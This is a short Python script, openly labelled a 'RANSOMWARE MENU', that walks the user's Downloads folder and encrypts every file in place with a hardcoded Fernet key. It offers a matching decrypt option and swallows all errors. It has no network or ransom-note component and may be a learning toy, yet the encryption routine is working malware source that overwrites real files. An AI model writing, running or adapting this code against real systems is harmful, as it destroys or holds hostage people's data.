from pathlib import Path
from cryptography.fernet import Fernet
import sys

class Printer():
    def __init__(self,data):
        sys.stdout.write("\r\x1b[K"+data.__str__())
        sys.stdout.flush()

def getFiles(p):
    flist = p.glob('**/*')
    files = [x for x in flist if x.is_file()]
    return files

def encrypt(filee):
    with open(filee, 'rb') as file: original = file.read()
    encrypted = fernet.encrypt(original)
    with open(filee, 'wb') as encrypted_file: encrypted_file.write(encrypted)

def decrypt(filee):
    with open(filee, 'rb') as file: content = file.read()
    decrypted = fernet.decrypt(content)
    with open(filee, 'wb') as file: file.write(decrypted)

def showMenu():
    print('[RANSOMWARE MENU]')
    print('\t1)Encrypt files')
    print('\t2)Decrypt files')
    return(int(input('Option: ')))

print('Calculating number of files..')
#Configure starting path of the ransomware
path = Path(Path.home()).absolute()
foldername = path / 'Downloads'
files = getFiles(foldername)
#Cryptography key
fernet = Fernet('bjq5lagsjEDIvxmWM6badVWEFD4wSGVatHaSCoYZqeI=')

size = len(files)
print(f'Number of files: {size}\n')

opt = showMenu()
while opt != 9:
    if opt == 1: 
        for index,x in enumerate(files):
            output = "Encrypting file " + str(index + 1) + '/' + str(size)
            Printer(output)
            try: encrypt(x)
            except Exception: pass
        print('\nEncryption process finished\n')
    if opt == 2:
        for index,x in enumerate(files):
            output = "Decrypting file " + str(index + 1) + '/' + str(size)
            Printer(output)
            try: decrypt(x)
            except Exception: pass
        print('\nDecryption process finished\n')
    opt = showMenu()
